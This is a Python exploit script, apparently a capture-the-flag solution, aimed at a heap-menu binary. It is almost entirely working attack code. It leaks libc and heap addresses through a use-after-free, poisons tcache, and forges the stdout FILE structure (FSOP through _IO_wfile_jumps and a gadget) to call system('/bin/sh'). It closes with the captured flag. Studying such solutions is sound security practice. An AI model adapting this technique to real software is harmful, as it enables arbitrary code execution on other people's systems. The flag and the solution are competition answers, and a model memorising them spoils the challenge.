#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./prob', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x0000000000001422
brva 0x00000000000015F5
brva 0x0000000000001619
brva 0x0000000000001639
brva 0x0000000000001764
brva 0x0000000000001865

# brva 0x00000000000019C9
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def add(idx, size, name, content):
    sna(b'> ', 1)
    sna(b'> ', idx)
    sna(b'> ', size)
    sa(b'> ', name)
    sa(b'> ', content)
def delete(idx):
    sna(b'> ', 2)
    sna(b'> ', idx)

def edit(idx, name, content):
    sna(b'> ', 3)
    sna(b'> ', idx)
    sa(b'> ', name)
    sa(b'> ', content)

def show(idx):
    sna(b'> ', 4)
    sna(b'> ', idx)
# ==================== EXPLOIT ====================
p = start()

# Chunks at 0x555555558060
# isDelete at 0x5555555580e0

# Leak heap address
add(0, 0x420, b'A'*0x8, b'B'*0x8)
add(1, 0xf8, b'A'*0x8, b'B'*0x8)
add(2, 0xf8, b'A'*0x8, b'B'*0x8)

delete(0)
delete(2)
delete(1)

delete(0) # Make bool operation isDelete[0] == 0
delete(1) # Make bool operation isDelete[1] == 0

show(0)
ru(b'name : ')
libc.address = fixleak(rl()[:-1]) - 0x21ace0
slog('libc base @ %#x', libc.address)

ru(b'content : ')
heap = fixleak(rl()[:-1]) << 12
slog('heap @ %#x', heap)

# debug()
# Tcache poisioning
edit(1, p64(mangle(heap, libc.sym._IO_2_1_stdout_)) + p64(0), p64(mangle(heap, heap+0x9e0)) + p64(0))

# FSOP (But we can use ROP here)
# stdout_lock = libc.sym["_IO_stdfile_1_lock"]   # _IO_stdfile_1_lock  (symbol not exported)
stdout_lock = libc.address + 0x21ca70
stdout = libc.address + 0x21b780
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001636a0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']     # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock = stdout_lock
fake._codecvt = stdout + 0xb8
fake._wide_data = stdout+0x200            # _wide_data just need to points to empty zone
fake.unknown2 = p64(0)*2 + p64(stdout+0x20) + p64(0)*3 + p64(fake_vtable)

add(1, 0xf8, b'A'*0x8, b'B'*0x8)
sna(b'> ', 1)
sna(b'> ', 2)
sna(b'> ', 0xf8)
sa(b'> ', bytes(fake))

interactive()
# DH{8d35746cd5b310eb65dcfeed2e05188b5db616378073efd91fd2f6204a34bf48:4yfu3T+2wFMDFcmcWcQBTg==}
